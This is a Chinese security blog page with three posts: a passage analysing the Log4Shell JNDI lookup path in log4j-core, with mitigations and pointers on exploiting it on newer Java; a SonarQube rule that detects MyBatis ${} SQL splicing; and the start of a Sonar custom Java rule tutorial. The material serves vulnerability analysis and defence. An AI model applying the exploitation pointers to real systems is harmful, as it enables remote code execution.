<p>在调用栈里我们可以看到关键的几个动作：<br>lookup:172, JndiManager (<a href="http://org.apache.logging.log4j.core.net/" target="_blank" rel="noopener">org.apache.logging.log4j.core.net</a>)<br>lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)<br>lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)<br>resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)<br>format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)<br>这几个动作都在log4j-core组件包中，也印证了前面说的有log4j-api就有问题，实际上修复漏洞首要需要关注log4j-core包。</p>
<p>从toText这个函数开始跟进，这里开始转化event内容进行输出。</p>
<p><img src="/images/211210/Image%20%5B10%5D.png" alt=""></p>
<p> toSerializable函数遍历使用PatternFormatter对event进行格式化。</p>
<p><img src="/images/211210/Image%20%5B11%5D.png" alt=""></p>
<p>在第15个PatternFormatter——MessagePatternConverter进行操作时，event中如果有${就会进行替换。</p>
<p><img src="/images/211210/Image%20%5B12%5D.png" alt=""></p>
<p>这里打个岔，可以看到进入替换逻辑有noLookups为false的前提，所以这里就有了临时修复方案将这个变量设置为true，而这个变量就是<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>常量，来源于从配置中查找log4j2.formatMsgNoLookups的值，默认为false。</p>
<p><img src="/images/211210/Image%20%5B13%5D.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B14%5D.png" alt=""></p>
<p>言归正传，后续调用substitute递归解析文本中的变量值，注释中也有说明。</p>
<p><img src="/images/211210/Image%20%5B15%5D.png" alt=""></p>
<p>resolveVariable进行具体的变量解析，后续就是lookup调用，最终调用java的lookup，所以也受java环境限制。</p>
<p><img src="/images/211210/Image%20%5B16%5D.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B17%5D.png" alt=""></p>
<p>在高版本的java环境中可以参考采用tomcat-embed执行代码，是比较容易利用的，后续会尝试将POC改造进行尝试，也可以参考<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>和<a href="https://skysliently.github.io/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">dubbo反序列化（CVE-2020-1948）可用链路学习</a>一文。</p>
<h4 id="临时修补措施"><a href="#临时修补措施" class="headerlink" title="临时修补措施"></a>临时修补措施</h4><p>根据前文内容我们可以简单得出一些临时解决方式，当然这是牺牲了原本的功能</p>
<p>设置 jvm 启动参数 “-Dlog4j2.formatMsgNoLookups=true”（先升级到2.10+）<br>在添加额外的log4j2.component.properties配置文件，增加“log4j2.formatMsgNoLookups=True”配置（同上）<br>高版本的java环境也能增加利用难度</p>
<p>使用临时方案后可以在应用启动后打印org.apache.logging.log4j.core.util.Constants.<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>参数，是true就关闭了lookup功能。</p>
<p>顺便吐槽一下网上的修复方案一开始都没说到底在哪里加“log4j2.formatMsgNoLookups=True”配置，我设置了application.properties和log4j2.properties都没有效果，最后在代码里面找到是log4j2.component.properties配置文件。</p>
<p><img src="/images/211210/Image%20%5B18%5D.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/03/sonar%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99%E5%85%A5%E9%97%A8%E9%9A%8F%E8%AE%B0-XML/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/03/sonar%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99%E5%85%A5%E9%97%A8%E9%9A%8F%E8%AE%B0-XML/" class="post-title-link" itemprop="url">sonar自定义规则入门随记-XML</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-03 16:51:07 / 修改时间：16:57:17" itemprop="dateCreated datePublished" datetime="2021-12-03T16:51:07+08:00">2021-12-03</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>上篇简叙述了sonar 自定义Java规则，但是在Java项目中不只有Java代码，XML也很常见，这片就来讨论有关XML扫描的入门学习，目标是检测mybatis的配置文件。</p>
<p>首先和Java应用需要实现一个扫描器类，Java是JavaFileScanner而XML则是SonarXmlCheck，这里我选择sonar其他的开源项目中的sonar-xml，通过这个项目中已经实现的规则来学习，这也是一个Java实现的规则项目。首先克隆代码导入IDE，注意项目版本根据sonar安装的插件版本来选择，在sonar规则库中 找一条有关XML的规则，通过描述信息在源代码中找到这条规则。</p>
<p><img src="/images/211203/Image%20.png" alt=""></p>
<p><img src="/images/211203/Image%20%5B1%5D.png" alt=""></p>
<p>我选择了LineLengthCheck和TodoCommentCheck两个规则来学习，先看TodoCommentCheck，这个规则用来检测XML中的TODO内容，我们看一下它的测试文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--todo--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">foo</span>&gt;</span> todo <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!----&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 &#123;&#123;Complete the task associated to this "TODO" comment.&#125;&#125; --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- TODO --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  ^^^^^^^^^^^^^ --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- todo --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- myTodo --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- toDo explanation --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- [TODO] --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Noncompliant@+1 --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- todo.txt false positive --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- TodoNot --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试文件指出了需要被检测的TODO标记位置，再看规则本身</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Rule</span>(key = TodoCommentCheck.RULE_KEY)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TodoCommentCheck</span> <span class="keyword">extends</span> <span class="title">CommentContainsPatternChecker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String RULE_KEY = <span class="string">"S1135"</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATTERN = <span class="string">"TODO"</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MESSAGE = <span class="string">"Complete the task associated to this \"TODO\" comment."</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">TodoCommentCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(PATTERN, MESSAGE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到只是直接调用了父类的构造方法，检测功能实际上由父类CommentContainsPatternChecker实现，其代码如下，是一个抽象类。主要的检测函数是checkIfCommentContainsPattern</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentContainsPatternChecker</span> <span class="keyword">extends</span> <span class="title">SimpleXPathBasedCheck</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String pattern;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> XPathExpression xPathExpression = getXPathExpression(<span class="string">"//comment()"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="title">CommentContainsPatternChecker</span><span class="params">(String pattern, String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.pattern = pattern.toLowerCase(Locale.ENGLISH);</span><br><span class="line">    <span class="keyword">this</span>.message = message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">scanFile</span><span class="params">(XmlFile file)</span> </span>&#123;</span><br><span class="line">    checkIfCommentContainsPattern(file);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isLetterAround</span><span class="params">(String line, String pattern)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = line.indexOf(pattern);</span><br><span class="line">    <span class="keyword">int</span> end = start + pattern.length();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> pre = start &gt; <span class="number">0</span> &amp;&amp; Character.isLetter(line.charAt(start - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">boolean</span> post = end &lt; line.length() - <span class="number">1</span> &amp;&amp; Character.isLetter(line.charAt(end));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pre || post;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkIfCommentContainsPattern</span><span class="params">(XmlFile file)</span> </span>&#123;</span><br><span class="line">    evaluateAsList(xPathExpression, file.getDocument()).forEach(node -&gt; &#123;</span><br><span class="line">      String comment = node.getNodeValue().toLowerCase(Locale.ENGLISH);</span><br><span class="line">      <span class="keyword">if</span> (comment.contains(pattern) &amp;&amp; !isLetterAround(comment, pattern)) &#123;</span><br><span class="line">        reportIssue(node, message);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数会将文件以Xpath解析后形成ArrayList</p>
<p><img src="/images/211203/Image%20%5B2%5D.png" alt=""></p>
<p>然后再循环遍历列表中的元素执行检测逻辑</p>
<p>这里仿照此逻辑读取一个XML文件尝试一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLMybatisSQLIRule</span> <span class="keyword">extends</span> <span class="title">SimpleXPathBasedCheck</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> XPathExpression xPathExpression = getXPathExpression(<span class="string">"//comment()"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scanFile</span><span class="params">(XmlFile xmlFile)</span> </span>&#123;</span><br><span class="line">        evaluateAsList(xPathExpression, xmlFile.getDocument()).forEach(node -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="number">0</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写个测试，运行报错</p>
<p><img src="/images/211203/Image%20%5B3%5D.png" alt=""></p>
<p>在sonar-xml-plugin中找到对应依赖，注意补齐版本，和sonar-analyzer-commons版本一致即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.sonarsource.analyzer-commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sonar-analyzer-test-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>依然报错，发现是不同版本的，其中的包路径不一致，手动在pom里加上保证版本一致</p>
<p><img src="/images/211203/Image%20%5B4%5D.png" alt=""></p>
<p>运行后成功将文件中标注了<em>Noncompliant</em>的位置标记了出来，有关XPath表达式可以参考<a href="https://www.apiref.com/java11-zh/java.xml/javax/xml/xpath/package-summary.html" target="_blank" rel="noopener">https://www.apiref.com/java11-zh/java.xml/javax/xml/xpath/package-summary.html</a></p>
<p>在我们的检测逻辑中，首先得确认这个文件是mybatis的配置文件，所以要校验”-//<a href="http://mybatis.org//DTD" target="_blank" rel="noopener">mybatis.org//DTD</a> Mapper 3.0//EN” “<a href="http://mybatis.org/dtd/mybatis-3-mapper.dtd”两个DOCTYPE值" target="_blank" rel="noopener">http://mybatis.org/dtd/mybatis-3-mapper.dtd”两个DOCTYPE值</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String DTD_PUBLIC_ID = <span class="string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String DTD_SYSTEM_ID = <span class="string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scanFile</span><span class="params">(XmlFile xmlFile)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!xmlFile.getDocument().getDoctype().getPublicId().equalsIgnoreCase(DTD_PUBLIC_ID)</span><br><span class="line">            || !xmlFile.getDocument().getDoctype().getSystemId().equalsIgnoreCase(DTD_SYSTEM_ID)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来可以将目标定得简单一些，例如找到SQL语句中存在使用$符号的位置。要达到这个目的，需要的步骤是在满足之前条件的前提下，在有SQL语句的标签中找到有使用$拼接符的位置<br>依照上述的步骤得到以下检测逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Rule</span>(key = <span class="string">"XMLMybatisSQLIRule"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLMybatisSQLIRule</span> <span class="keyword">extends</span> <span class="title">SonarXmlCheck</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String DTD_PUBLIC_ID = <span class="string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String DTD_SYSTEM_ID = <span class="string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; SQL_METHOD_LIST = <span class="keyword">new</span> ArrayList(Arrays.asList(</span><br><span class="line">            <span class="string">"select"</span></span><br><span class="line">            ,<span class="string">"insert"</span></span><br><span class="line">            ,<span class="string">"update"</span></span><br><span class="line">            ,<span class="string">"delete"</span></span><br><span class="line">            ,<span class="string">"if"</span></span><br><span class="line">            ,<span class="string">"sql"</span></span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String MYBATIS_SQL_MATCH = <span class="string">"\\$\\&#123;(\\d|\\w)+\\&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Pattern MYBATIS_SQL_MATCHER = Pattern.compile(MYBATIS_SQL_MATCH);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scanFile</span><span class="params">(XmlFile xmlFile)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!xmlFile.getDocument().getDoctype().getPublicId().equalsIgnoreCase(DTD_PUBLIC_ID)</span><br><span class="line">                || !xmlFile.getDocument().getDoctype().getSystemId().equalsIgnoreCase(DTD_SYSTEM_ID)</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visitNode(xmlFile.getDocument());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">visitNode</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">        List&lt;Node&gt; children = XmlFile.children(node);</span><br><span class="line">        <span class="keyword">if</span> (SQL_METHOD_LIST.contains(node.getNodeName().toLowerCase())) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Node childrenNode:</span><br><span class="line">                 children) &#123;</span><br><span class="line">                <span class="keyword">if</span> (childrenNode.getNodeName().equalsIgnoreCase(<span class="string">"#text"</span>)) &#123;</span><br><span class="line">                    Matcher m = MYBATIS_SQL_MATCHER.matcher(childrenNode.getTextContent());</span><br><span class="line">                    <span class="keyword">if</span> (m.find()) &#123;</span><br><span class="line">                        reportIssue(childrenNode,<span class="string">"found sql!"</span>);</span><br><span class="line">                        System.out.println(<span class="string">"found sql!"</span>);</span><br><span class="line">                        System.out.println(childrenNode.getNodeName());</span><br><span class="line">                        System.out.println(childrenNode.getTextContent());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        children.forEach(<span class="keyword">this</span>::visitNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于不需要用到SimpleXPathBasedCheck中的方法，我将父类直接换成了SonarXmlCheck。在确认了当前文件是mybatis配置文件后，获取当前文件的节点并获取所有子节点，检测select、insert、update、delete、if、sql标签中的子节点，如果子节点是#text字符类型且子节点中的语句包含${…}则认为这个语句书写不规范，最后对子节点进行递归处理。<br>随后在测试中可以确定，此规则可以探测配置文件中使用$拼接的语句。</p>
<p><img src="/images/211203/Image%20%5B5%5D.png" alt=""></p>
<p><img src="/images/211203/Image%20%5B6%5D.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/08/sonar%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99%E5%85%A5%E9%97%A8%E9%9A%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/08/sonar%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99%E5%85%A5%E9%97%A8%E9%9A%8F%E8%AE%B0/" class="post-title-link" itemprop="url">sonar自定义规则入门随记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-08 17:22:40 / 修改时间：18:07:57" itemprop="dateCreated datePublished" datetime="2021-11-08T17:22:40+08:00">2021-11-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文记录有关sonar自定义规则的入门。</p>
<p>sonar自定义功能是以插件的形式进行集成附加的，其自定义功能非常丰富，包括前后端功能都能实现自定义，这里只讨论有关代码扫描规则的自定义（Java）。</p>
<p>这里我根据官方指引进行入门（<a href="https://docs.sonarqube.org/latest/extend/adding-coding-rules/）" target="_blank" rel="noopener">https://docs.sonarqube.org/latest/extend/adding-coding-rules/）</a></p>
<p><img src="/images/211108/Image%20.png" alt=""></p>
<p>在官方文档的 for Java链接中，有custom rules一栏，其中指明可以在<a href="https://redirect.sonarsource.com/doc/java-custom-rules-guide.html" target="_blank" rel="noopener">Writing Custom Java Rules 101</a>了解自定义Java规则，后续我们依照这个文档指引一步一步进行自定义规则的入门。</p>
<p>按照文档提示克隆sonar-java项目，并将其中的<a href="https://github.com/SonarSource/sonar-java/tree/master/docs/java-custom-rules-example" target="_blank" rel="noopener">java-custom-rules-examples</a>模块导入IDE中，随后对项目进行初始化。</p>
<p>我使用使用7.9版本的sonar测试，所以使用pom_SQ_7_9_LTS.xml替换pom.xml中的内容并执行 mvn clean install 初始化项目，这里推荐使用JDK11运行maven，因为这是sonar7.9默认的运行环境，我们需要确保开发环境与运行环境一致以免遇到问题。</p>
<p><img src="/images/211108/Image%20%5B1%5D.png" alt=""></p>
<p>然后我们需要将sonar7.9 的 Java Analyzer 插件更新到6.3.2.22818版本，这是pom.xml中依赖的版本，sonar7.9默认版本低于此版本。</p>
<p><img src="/images/211108/Image%20%5B2%5D.png" alt=""></p>
<p>随后我们根据文档指引编写自定义规则，这里不再和文档一样一步步展示，直接贴出完成后的结果，若需要可以在文档中查看作者的详细叙述。</p>
<p>在 /test/file/ 中创建一个待测试文件，注意// Noncompliant注释，这个注释标记了被探测代码的行位置，不加此标记将会导致测试抛出异常（也代表规则检测成功）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    MyClass(MyClass mc) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span>     <span class="title">foo1</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span>    <span class="title">foo2</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span>     <span class="title">foo3</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125; <span class="comment">// Noncompliant</span></span><br><span class="line">    <span class="function">Object  <span class="title">foo4</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">null</span>; &#125;</span><br><span class="line">    <span class="function">MyClass <span class="title">foo5</span><span class="params">(MyClass value)</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>; &#125; <span class="comment">// Noncompliant</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span>     <span class="title">foo6</span><span class="params">(<span class="keyword">int</span> value, String name)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span>     <span class="title">foo7</span><span class="params">(<span class="keyword">int</span> ... values)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成待检测文件后，编写规则，这个练习规则代表找到只有一个入参且参数与返回的类型相同的方法</p>
